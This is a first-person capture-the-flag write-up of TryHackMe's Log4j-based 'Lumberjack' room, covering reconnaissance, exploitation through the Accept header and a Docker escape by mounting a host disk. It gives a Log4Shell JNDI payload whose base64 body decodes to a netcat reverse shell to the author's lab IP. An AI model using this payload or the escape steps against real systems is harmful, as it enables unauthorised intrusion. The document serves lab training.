---
title: LumberJack-writeup-THM
date: '2022-01-18 15:23:05 +0200'
categories:
  -Log4j
tags: THM Log4j
published: true
---


## Status

 Hello everyone this is my first ctf writeup. Name of the box is Lumberjack from tryhackme, it’s based on Log4j (CVE-2021-44228) it is a medium level challenge.

Created by : SilverStr

Let’s start with basic recons

Recon:

nmap -sC -sV -Pn 10.10.120.161

![image](https://i.imgur.com/kkQdBV9.png)

Results from nmap showed 2 open ports

In ssh there is nothing to see so went to check up the http port 80.

\--------------------------------------------------------------------------------------------------------------------------------------
## lets start
![image](https://i.imgur.com/znguXwU.png)

Nothing to see in this port. After that I used burp to capture the request of this site.

![image](https://i.imgur.com/VeMZtpN.png) 

They give a resource to refer the log4j vulnerability. 

![image](https://i.imgur.com/uhrIwin.png)

**References used to make this room:**

- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
- Malicious LDAP servers are fun. (Come on.... work for it a bit)

I send the request to repeater and I used basic payload of log4j to manipulate the request via the user agent but I didn’t get any proper response. 

![image](https://i.imgur.com/qjM9aJH.png)

I saw the accept “request header” in burp .so, I decided to send the payload via the accept header.

![image](https://i.imgur.com/Jnj3lL2.png)

I got the proper response via this accept header.

Let’s try to get shell using JNDIexploit...

Java -jar JNDIExlpoit-1.2-SNAPSHOT.jar -u

![image](https://i.imgur.com/uREj2Bv.png)

I used this payload for the reverse shell via nc.

Let’s set the exploit:

![image](https://i.imgur.com/GrsdUPz.png)

Reverse shell payload to base 64.

${jndi:ldap://10.8.19.239:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjguMTkuMjM5IDQ0NDQgPi90bXAvZg==}


![image](https://i.imgur.com/Cg2XA34.png)

I send the payload via the accept header. 

![image](https://i.imgur.com/37NrKQu.png)

Finally, I got the shell. Let’s find the 1st flag;

![image](https://i.imgur.com/ibUyBtP.png)

It’s a docker environment... I go to the opt directory for flag’s 


![image](https://i.imgur.com/lM2qnBa.png)



I got the 1st flag …

cat .flag1 

Let’s check for 2nd flag, after long time I decide to use linpease to know vulnerabilities.

I will set the python server to get the linpeas from my machine to that vuln machine.

![image](https://i.imgur.com/898sjck.png)

Let’s give the execute permission to the linpeas chmod +x linpeas.sh and run the linpeas

I saw the suid unmount in the bin directory..

![image](https://i.imgur.com/ZIYlfIi.png)

Let’s see what is in dev directory, I found some directories which is unmounted on disk.

![image](https://i.imgur.com/Ux2QzX9.png)  

Make the empty directory in the tmp directory ‘123’ to mount it. 

![image](https://i.imgur.com/44fEVXe.png)

After that I will go to the root directory which is on mounted folder ‘123’

![image](https://i.imgur.com/CWwj8DS.png)






On the root directory I saw the root.txt, but here I got depressed. 

![image](https://i.imgur.com/44YLZZF.png) 

After few moments I saw the directory which is ‘…’ 

cd …;ls -la

cat .\_fLaG2

![image](https://i.imgur.com/cyDyJ8y.png)

At last, I found the final flag. A wonderful medium level ctf to know what is log4j and how its working





`                          `……….….…………….Happy learning & Hunting ………………………




